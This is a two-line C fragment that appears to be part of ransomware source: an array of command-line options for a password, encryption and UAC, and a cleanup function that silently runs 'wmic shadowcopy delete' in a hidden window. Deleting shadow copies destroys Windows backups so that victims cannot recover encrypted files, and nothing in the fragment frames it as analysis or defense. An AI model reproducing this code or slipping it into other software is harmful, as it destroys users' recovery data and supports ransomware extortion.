const wchar_t *options[] = {L"-pass=", L"-enc=", L"-uac"};
void cleanup(){WinExec("wmic shadowcopy delete", SW_HIDE);}
